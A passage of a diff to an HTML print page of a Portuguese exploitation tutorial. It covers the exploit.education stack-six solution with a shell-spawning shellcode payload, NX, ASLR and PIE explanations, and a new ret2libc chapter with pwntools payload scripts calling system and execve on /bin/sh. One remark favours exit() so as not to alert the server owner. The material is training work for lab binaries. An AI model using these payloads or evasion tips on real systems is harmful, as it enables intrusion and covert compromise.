 0x00007fffffffe5c8│+0x00c8 0x00007fffffffef10
 </code></pre>
 <p>Porem, ainda tem um detalhe! Nos não queremos esse endereço no rbp! Nos queremos ele no rip!</p>
 <p>Assim, nos vamos apontar RBP para o item de cima da lista! Ai quando main retornar (<code>pop rip</code>) o valor vai ser o correto!</p>
-<p><img src="stack/phoenix/./img/stack_six/addr_rbp.png" alt="" /></p>
-<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos 
+<p><img src="./img/stack_six/addr_rbp.png" alt="" /></p>
+<p>Lembrando que, quando uma função retorna, o endereço 8 bytes maior que rbp, é onde o rip esta! Então por definir <code>rbp = 0x00007fffffffe5c0</code>, nos
 estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
 <p>E você talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
 <pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
@@ -1890,7 +1774,7 @@ estamos definindo <code>rip = 0x00007fffffffe5c8</code> então nos temos <code>R
 <p>Por sorte, justamente o inicio do nosso buffer! Então não precisa nem de NOP sled ate o shellcode</p>
 <pre><code>Se você quer continuar sozinhx, agora é sua hora de brilhar!
 Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow é: c0
-Eu recomendo vc tentar encontrar ele por conta propria pois
+Eu recomendo vc tentar encontrar ele por conta própria pois
 pode variar de acordo com o seu computador (explicação em breve) :D
 .
 .
@@ -1900,7 +1784,7 @@ pode variar de acordo com o seu computador (explicação em breve) :D
 .
 .
 </code></pre>
-<h2><a class="header" href="#shellcode-1" id="shellcode-1">Shellcode</a></h2>
+<a class="header" href="print.html#shellcode-1" id="shellcode-1"><h2>Shellcode</h2></a>
 <p>Então o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
 <p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
 <pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
@@ -1910,21 +1794,21 @@ Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
 Trace/breakpoint trap
 </code></pre>
-<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
-<p>Isso quer dizer que conseguimos execução de codigo! lembrando que isso é muito fragil: uma alteração nas envs e o exploit quebra!</p>
-<p>Nos podemos usar tecnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
-<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as tecnicas ensinadas previamente para tornar o exploit melhor!</p>
+<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela</p>
+<p>Isso quer dizer que conseguimos execução de código! lembrando que isso é muito frágil: uma alteração nas envs e o exploit quebra!</p>
+<p>Nos podemos usar técnicas como encontrar um pointer que esta numa localização fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
+<p>Porem, nesse desafio vamos focar em só fazer ele funcionar! Caso vc queira, pode aplicar as técnicas ensinadas previamente para tornar o exploit melhor!</p>
 <hr />
 <p><strong>Obs</strong></p>
-<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao enves de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
+<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao invés de <code>/opt/phoenix/amd64/stack-six</code>, o exploit não funciona :(</p>
 <pre><code class="language-x86asm">$ ./stack-six 
 Welcome to phoenix/stack-six, brought to you by https://exploit.education
 Welcome, I am pleased to meet you �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
 Segmentation fault
 </code></pre>
-<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code> 
-(uma variavel <strong>gigantesca</strong> que lista as cores do terminal! </p>
+<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferença é causada pela env <code>LS_COLORS</code>
+(uma variável <strong>gigantesca</strong> que lista as cores do terminal!</p>
 <p>Caso você utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferença!</p>
 <p>Mas você esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
 <hr />
@@ -1957,8 +1841,8 @@ groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
 <p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
 <hr />
 <p>Finalmente! terminamos a parte da stack uhuuu</p>
-<p>Esse stack-six foi beeeeem complicadinho! Então parabens por ter chegado ate aqui! :D</p>
-<h1><a class="header" href="#-solução-6" id="-solução-6">💫 Solução</a></h1>
+<p>Esse stack-six foi beeeeem complicadinho! Então parabéns por ter chegado ate aqui! :D</p>
+<a class="header" href="print.html#-solução-6" id="-solução-6"><h1>💫 Solução</h1></a>
 <blockquote>
 <p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
 </blockquote>
@@ -1976,83 +1860,372 @@ groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
 <blockquote>
 <p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
 </blockquote>
-<h1><a class="header" href="#dep--nx--wx" id="dep--nx--wx">DEP | NX | W^X</a></h1>
-<p>Todas essas pretendem impedir a execução de código em 
+<a class="header" href="print.html#dep--nx--wx" id="dep--nx--wx"><h1>DEP | NX | W^X</h1></a>
+<p>Todas essas pretendem impedir a execução de código em
 partes da memoria que sejam &quot;escreviveis&quot;.</p>
-<p>Impedir que x atacante execute o código escrito 
+<p>Impedir que x atacante execute o código escrito
 pelx mesmx, previne que Shellcodes sejam usados! :D</p>
-<p>Assim, ou uma parte da memoria ou pode ser escrita, ou 
-executável, mas nunca as duas simultaneamente: 
+<p>Assim, ou uma parte da memoria ou pode ser escrita, ou
+executável, mas nunca as duas simultaneamente:
 <strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
-<p>Você vai ouvir pessoas usando os 3 nomes para representar 
+<p>Você vai ouvir pessoas usando os 3 nomes para representar
 esse conceito, e dependendo do contexto não tem problema!</p>
 <p>Porem eles são tecnicamente diferentes:</p>
-<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados): 
+<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados):
 a implementação do <strong>Windows</strong></p>
-<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para 
+<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para
 garantir a exclusão mutua em processadores <strong>AMD</strong>.</p>
-<p>Intel tem um outro nome, que eu não lembro... 
+<p>Intel tem um outro nome, que eu não lembro...
 e não importa o suficiente para eu pesquisar! :P</p>
 <blockquote>
-<p>Atualmente, a exclusão mutua de escrever e executar 
-ocorre por meio de paging: o sistema operacional decide 
-as permicoes das paginas de memorias, e garante que uma 
-não viole W^X . <strong>No momento que você esta lendo, isso 
+<p>Atualmente, a exclusão mutua de escrever e executar
+ocorre por meio de paging: o sistema operacional decide
+as permissões das paginas de memorias, e garante que uma
+não viole W^X . <strong>No momento que você esta lendo, isso
 pode ter mudado!</strong></p>
 </blockquote>
-<h1><a class="header" href="#system-aslr" id="system-aslr">System ASLR</a></h1>
-<p>ASLR randomiza os endereços das coisas na memoria! Porem 
-com as suas limitações, dado que depende doo sistema 
+<a class="header" href="print.html#system-aslr" id="system-aslr"><h1>System ASLR</h1></a>
+<p>ASLR randomiza os endereços das coisas na memoria! Porem
+com as suas limitações, dado que depende doo sistema
 operacional!</p>
 <p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
 <ul>
 <li>Imports dinamicos (LIBC,...)</li>
-<li>Segmentos do executavel (Data, ROData, ...)</li>
+<li>Segmentos do executável (Data, ROData, ...)</li>
 <li>Stack e Heap</li>
 </ul>
 <p><strong>Porem, o endereço do código não muda!</strong></p>
-<h1><a class="header" href="#pie" id="pie">PIE</a></h1>
-<p>Para garantir que o codigo tambem tenha sua posição 
-randomizada, o binario precisa ser compilado com PIE !</p>
-<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osição) impede 
+<a class="header" href="print.html#pie" id="pie"><h1>PIE</h1></a>
+<p>Para garantir que o código também tenha sua posição
+randomizada, o binário precisa ser compilado com PIE !</p>
+<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osição) impede
 que o codigo possa ser executado independente da sua<br />
 posição na memoria (duh :P)</p>
 <p>Para garantir isso, todos endereços precisam ser relativos ao invés de absolutos!</p>
-<pre><code>			Endereço	Instrução
+<pre><code>            Endereço	Instrução
 Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
-			0x0002	add 1 2
-			0x0003	add 1 3
+            0x0002	add 1 2
+            0x0003	add 1 3
 
 Com PIE     ------	jmp EIP+2  &lt;- EIP
-			------	add 1 2
-			------	add 1 3
+            ------	add 1 2
+            ------	add 1 3
 </code></pre>
-<p>No primeiro caso, se o executável mudar de endereço 
-o <code>JMP</code> pularia para a instrução errada, por causa do 
+<p>No primeiro caso, se o executável mudar de endereço
+o <code>JMP</code> pularia para a instrução errada, por causa do
 endereço absoluto.</p>
-<h1><a class="header" href="#canaries--todo-" id="canaries--todo-">Canaries ( ~TODO~ )</a></h1>
+<hr />
+<p>TODO</p>
+<hr />
+<a class="header" href="print.html#relro" id="relro"><h1>RELRO</h1></a>
+<a class="header" href="print.html#canaries" id="canaries"><h1>Canaries</h1></a>
+<a class="header" href="print.html#outras" id="outras"><h1>Outras</h1></a>
+<a class="header" href="print.html#linux" id="linux"><h2>Linux</h2></a>
+<a class="header" href="print.html#pointer-guard" id="pointer-guard"><h3>Pointer Guard</h3></a>
+<a class="header" href="print.html#windows" id="windows"><h2>Windows</h2></a>
+<a class="header" href="print.html#ret2libc" id="ret2libc"><h1>Ret2LibC</h1></a>
+<p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso,
+ter domínio dessa técnica facilitar a compreensão de ROP. :D</p>
+<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos
+encontrar outra maneira de conseguir uma shell... Assim, vamos precisar
+encontrar uma parte executável na memoria! Uma função do próprio programa!</p>
+<p>Voce se lembra de quando chamávamos uma <code>call_me()</code> ou <code>win()</code> nos desafios
+iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma
+função pre-pronta pra nos dar uma shell :(</p>
+<p>Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!</p>
+<a class="header" href="print.html#funções-Úteis" id="funções-Úteis"><h1>Funções Úteis</h1></a>
+<a class="header" href="print.html#system" id="system"><h2>System()</h2></a>
+<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
+<p>Para nosso propósito, ela recebe 1 argumento, o caminho do programa para
+executar (Ex: <code>/bin/sh</code>)</p>
+<p>Em C:</p>
+<pre><code class="language-C">#include &lt;stdlib.h&gt;
+int main() {
+    system(&quot;/bin/ls&quot;);
+    return 0;
+}
+</code></pre>
+<p>Em assembly:</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;/bin/ls&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edi, OFFSET FLAT:.LC0
+        call    System
+        mov     eax, 0
+        pop     rbp
+        ret
+</code></pre>
+<p>A função recebe um pointer para a string via <code>rdi</code> (64 bits) ou os
+argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32
+bits!</p>
+<a class="header" href="print.html#conseguindo-o-pointer-para-binsh" id="conseguindo-o-pointer-para-binsh"><h4>Conseguindo o pointer para /bin/sh</h4></a>
+<p>Usando pwntools:</p>
+<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
+</code></pre>
+<p>x sera um pointer contendo o endereço da string <code>/bin/sh</code></p>
+<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
+<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
+Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
+<a class="header" href="print.html#layout-da-stack-numa-call-32-bits" id="layout-da-stack-numa-call-32-bits"><h4>Layout da stack numa call 32 bits</h4></a>
+<pre><code class="language-x86asm">    Func_1
+ ____________
+|            |
+|    RBP     | 
+|____________| 
+ ____________
+|            |
+|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
+|____________|      Porem, nao costumamos pensar o que acontece depois!
+ ____________
+|            |      Um ret simplesmente significa:
+|   ARG_1    |         pop RIP
+|____________|         jmp RIP
+ ____________           
+|            |      E como em qualquer pop, RSP se movimenta
+|   ARG_2    |
+|____________| 
 
-                    </main>
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
+|____________|   Então da perspectiva de System,   |____________|
+ ____________           ARG_1 vira RIP              ____________       
+|            |          ARG_2 vira ARG_1           |            |
+|    RIP     |   ____                              |            |
+|____________|       |                             |____________|
+ ____________        |                              ____________
+|            |       V                             |            |  
+|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|   ARG_2    |                                     |   ARG_1    |
+|____________|                                     |____________|
 
-                    <nav class="nav-wrapper" aria-label="Page navigation">
-                        <!-- Mobile navigation buttons -->
-                        
 
-                        
+    Func_1                                             System
+ ____________                                       ____________            
+|            |                                     |            |
+| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
+|____________|                                     |____________|
+ ____________                                       ____________       
+|            |    E nos controlamos a stack :D     |            |
+|  SYSTEM()  |    Então podemos passar os args     |            |
+|____________|    e o RIP de retorno para System   |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
+|____________|                                     |____________|
+ ____________                                       ____________
+|            |                                     |            |  
+|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
+|____________|                                     |____________|
 
-                        <div style="clear: both"></div>
-                    </nav>
+                  System (ou qualquer outra 
+                  função que voce chamar) 
+                  vai executar /bin/sh e 
+                  tentar retornar para DDDDDDDD
+
+</code></pre>
+<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
+<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
+<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo
+(<code>fork</code>, gerando um processo secundário: <code>child_proc</code>)!</p>
+<p>Então retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera
+reportado para o processo principal e nao para o computador!</p>
+<blockquote>
+<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
+</blockquote>
+<a class="header" href="print.html#unindo-tudo" id="unindo-tudo"><h3>Unindo tudo</h3></a>
+<p>Vamos supor que o programa esta vulnerável a um BoF tradicional na função
+<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
+<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40            # Padding
+payload += p32(libc.sym.system) # RIP salvo batata()
+payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
+</code></pre>
+<p>Caso voce esteja com pressa, adios!</p>
+<p>Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens
+e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender
+ROP!</p>
+<a class="header" href="print.html#execve--exit" id="execve--exit"><h2>Execve() + Exit()</h2></a>
+<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
+<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e
+funciona igual <code>System</code>, porem com uma diferença: <code>System</code> cria um novo
+processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
+<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em
+<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce
+simplesmente chamar ele, quando voce fechar a shell vai gerar uma
+<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
+<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e
+ativando mecanismos de segurança que alertam o dono do servidor!</p>
+<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o
+programa finalize silenciosamente!</p>
+<p>Alem disso, existe mais uma diferença, <code>execve</code> recebe 3 argumentos:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  execve(&quot;./blablabla&quot;, NULL, NULL);
+  return 1;
+}
+</code></pre>
+<p>O primeiro: programa a ser executado</p>
+<p>O segundo: argv (poderíamos passar <code>-p</code> para <code>sh</code> manter os privilégios)</p>
+<p>O terceiro: envp (environment vars)</p>
+<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
+<p>Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register</p>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        mov     edx, 0                ; envp
+        mov     esi, 0                ; argv
+        mov     edi, OFFSET FLAT:.LC0 ; programa
+        call    execve
+        mov     eax, 1
+        pop     rbp
+        ret
+</code></pre>
+<p>Caso voce queira usar argv:</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, NULL);
+  return 1;
+}
+</code></pre>
+<pre><code class="language-x86asm">.LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 32
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        lea     rax, [rbp-32]
+        mov     edx, 0
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC2
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
+<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
+  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
+  execve(&quot;./blablabla&quot;, argv, envp);
+  return 1;
+}}
+</code></pre>
+<pre><code class="language-x86asm">..LC0:
+        .string &quot;arg1&quot;
+.LC1:
+        .string &quot;arg2&quot;
+.LC2:
+        .string &quot;env1&quot;
+.LC3:
+        .string &quot;env2&quot;
+.LC4:
+        .string &quot;./blablabla&quot;
+main:
+        push    rbp
+        mov     rbp, rsp
+        sub     rsp, 64
+        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
+        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
+        mov     QWORD PTR [rbp-16], 0
+        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
+        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
+        mov     QWORD PTR [rbp-48], 0
+        lea     rdx, [rbp-64]
+        lea     rax, [rbp-32]
+        mov     rsi, rax
+        mov     edi, OFFSET FLAT:.LC4
+        call    execve
+        mov     eax, 1
+        leave
+        ret
+</code></pre>
+<p>Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:</p>
+<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF(&quot;./blablabla&quot;)
+libc = elf.libc
+
+payload = b&quot;&quot;
+payload += b&quot;A&quot; * 40                              # Padding
+payload += p32(libc.sym.execve)                   # RIP salvo batata()
+payload += p32(libc.sym.exit)                     # RIP salvo execve()
+payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
+payload += p32(0)                                 # argv execve()
+payload += p32(0)                                 # envp execve()
+</code></pre>
+<p>Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!</p>
+<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiça hehehe :/</p>
+<blockquote>
+<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima técnica (<code>mprotect</code>)
+sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
+</blockquote>
+<a class="header" href="print.html#mprotect--ret2shellcode-todo" id="mprotect--ret2shellcode-todo"><h2>Mprotect() + ret2shellcode (~TODO~)</h2></a>
+<a class="header" href="print.html#pontos-fracos" id="pontos-fracos"><h1>Pontos Fracos</h1></a>
+<a class="header" href="print.html#estaticamente-linkado" id="estaticamente-linkado"><h2>Estaticamente Linkado</h2></a>
+<p>Em programas estaticamente linkados ao libc, somente podemos usar uma
+fração das funções presentes, pois somente as que sao originalmente usadas
+pelo programa sao linkadas!</p>
+<a class="header" href="print.html#dinamicamente-linkado--aslr" id="dinamicamente-linkado--aslr"><h2>Dinamicamente Linkado (+ ASLR)</h2></a>
+<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o
+potencial do libc. Porem caso o computador possua ASLR ligado, sera
+necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou
+executar o exploit em loop ate voce dar sorte (viável somente em
+computadores 32 bits).</p>
+
                 </div>
+
+                <!-- Mobile navigation buttons -->
+                
+
+                
+
             </div>
 
-            <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                
+            
 
-                
-            </nav>
+            
 
         </div>
 
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
         
 
         
@@ -2060,34 +2233,17 @@ endereço absoluto.</p>
         
 
         
-        <script type="text/javascript">
-            window.playground_copyable = true;
+        <script>
+            $(document).ready(function() {
+                window.print();
+            })
         </script>
         
 
-        
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
 
-        
-        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
-        
-
-        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
-        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
-        <script src="book.js" type="text/javascript" charset="utf-8"></script>
-
-        <!-- Custom JS scripts -->
-        
-
-        
-        
-        <script type="text/javascript">
-        window.addEventListener('load', function() {
-            window.setTimeout(window.print, 100);
-        });
-        </script>
-        
+        <!-- Custom JS script -->
         
 
     </body>
